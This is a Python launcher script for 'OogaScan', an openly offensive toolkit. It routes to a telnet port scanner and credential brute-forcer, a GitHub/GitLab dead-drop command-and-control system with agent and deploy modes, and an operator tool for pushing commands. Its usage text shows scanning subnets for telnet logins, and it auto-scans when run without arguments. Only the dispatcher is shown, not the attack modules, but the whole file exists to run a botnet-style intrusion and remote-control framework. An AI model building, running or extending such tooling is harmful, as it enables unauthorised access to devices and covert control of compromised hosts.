#!/usr/bin/env python3
"""
OogaScan — Telnet Recon & Exploitation Framework

Unified entry point for all components:
  scan      — Telnet port scanner & brute-forcer
  c2        — GitHub/GitLab dead-drop C2 (PasteBomb)
  control   — Operator control tool (push commands to repos)
  api       — REST API for admin & lints dashboards
  config    — Generate default config file
"""

import sys
import argparse

BANNER = """\033[1;36m
   ██████   ██████   ██████   █████  ███████  ██████  █████  ███    ██
  ██    ██ ██    ██ ██       ██   ██ ██      ██      ██   ██ ████   ██
  ██    ██ ██    ██ ██   ███ ███████ ███████ ██      ███████ ██ ██  ██
  ██    ██ ██    ██ ██    ██ ██   ██      ██ ██      ██   ██ ██  ██ ██
   ██████   ██████   ██████  ██   ██ ███████  ██████ ██   ██ ██   ████

                  Telnet Recon & Exploitation Framework
\033[0m"""


def main():
    parser = argparse.ArgumentParser(
        description="OogaScan — Telnet Recon & Exploitation Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
modules:
  scan       Port scanning & credential brute-forcing
  c2         GitHub/GitLab dead-drop C2 (agent/server/deploy)
  control    Operator tool — push commands to repos
  api        REST API for admin & lints dashboards
  config     Generate a default config file

examples:
  %(prog)s                                     # auto-run scan on 0.0.0.0
  %(prog)s scan -T 192.168.1.0/24
  %(prog)s scan --ports 23,2323,8023
  %(prog)s scan --scan-only -T targets.txt
  %(prog)s c2 agent -r user/repo1 -r gl:user/backup-repo
  %(prog)s c2 server
  %(prog)s control
  %(prog)s config
""",
    )
    parser.add_argument("module", nargs="?", default="scan",
                        choices=["scan", "c2", "control", "api", "config"],
                        help="Module to run (default: scan)")

    args, remaining = parser.parse_known_args()

    print(BANNER)

    if args.module == "scan":
        sys.argv = [sys.argv[0]] + remaining
        from csan import main as scan_main
        scan_main()

    elif args.module == "c2":
        sys.argv = [sys.argv[0]] + remaining
        from pastebomb import main as pb_main
        pb_main()

    elif args.module == "control":
        sys.argv = [sys.argv[0]] + remaining
        from control import main as ctrl_main
        ctrl_main()

    elif args.module == "api":
        sys.argv = [sys.argv[0]] + remaining
        from api import main as api_main
        api_main()

    elif args.module == "config":
        from config import OogaConfig
        from pathlib import Path
        cfg = OogaConfig()
        path = Path(__file__).parent / "oogascan.json"
        cfg.save(path)
        print(f"[*] Default config written to {path}")
        print(f"    Edit it, then run: oogascan scan --config {path}")


if __name__ == "__main__":
    main()
